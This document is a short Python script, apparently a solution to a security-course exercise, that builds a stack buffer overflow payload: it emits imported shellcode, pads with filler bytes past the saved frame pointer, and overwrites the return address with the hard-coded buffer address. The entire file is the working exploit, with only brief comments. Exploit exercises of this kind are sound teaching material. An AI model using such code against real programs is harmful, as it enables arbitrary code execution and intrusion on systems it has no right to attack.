#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
ebp = 0xfffeec58
buf_offset = 0x6c
buf = ebp - buf_offset

# Write shellcode (at buf)
sys.stdout.buffer.write(shellcode)

# Pad until we hit and go just past old EBP
sys.stdout.buffer.write(b"A" * (buf_offset - len(shellcode) + 4))

# Write address of shellcode (buf)
sys.stdout.buffer.write(pack("<I", buf))
